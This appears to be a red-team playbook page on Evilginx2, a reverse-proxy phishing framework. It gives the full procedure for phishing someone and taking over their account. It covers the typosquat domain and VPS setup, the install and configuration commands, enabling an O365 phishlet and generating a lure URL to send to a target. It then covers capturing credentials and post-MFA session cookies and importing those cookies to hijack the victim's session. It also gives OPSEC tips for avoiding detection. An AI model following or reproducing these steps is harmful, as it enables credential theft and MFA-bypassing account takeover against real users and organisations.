# 02.03 Evilginx2

> Reverse-proxy phishing framework that captures credentials AND session cookies — defeats most MFA.

## Overview

Evilginx2 proxies the target login page through your server, capturing credentials AND the post-MFA session cookie. Once you have the session cookie, you can hijack the authenticated session — bypassing MFA. Each target site needs a `phishlet` (YAML config describing URLs, cookies, etc.). Pre-built phishlets exist for O365, Google, Okta, GitHub, etc.

## Steps

- **Step 1** - Stand up a clean VPS with a typosquat domain.
- **Step 2** - Install Evilginx2 + a phishlet for target.
- **Step 3** - Configure lure and send to target.
- **Step 4** - Capture creds + session cookie, hijack session.
- **Step 5** - OPSEC — TLS cert via Let's Encrypt, mature domain, throwaway VPS

## Commands

### Install

```bash
git clone https://github.com/kgretzky/evilginx2
cd evilginx2 && make
./evilginx2 -p ./phishlets/
```

### Configure

```text
config domain <C2-DOMAIN>
config ipv4 <ATTACKER-IP>
phishlets enable o365
lures create o365
lures get-url 0   # returns the phish URL to send
```

### Watch for captures

```text
sessions  # list authenticated sessions
sessions 1 # inspect session 1, includes captured cookies
sessions delete <id>  # clean up after engagement
```

### Hijack session with captured cookies

```text
1. Get cookies from `sessions <id>` output
2. Open browser DevTools → Application → Cookies
3. Import the captured cookies under target domain
4. Refresh — you're authenticated as victim
```
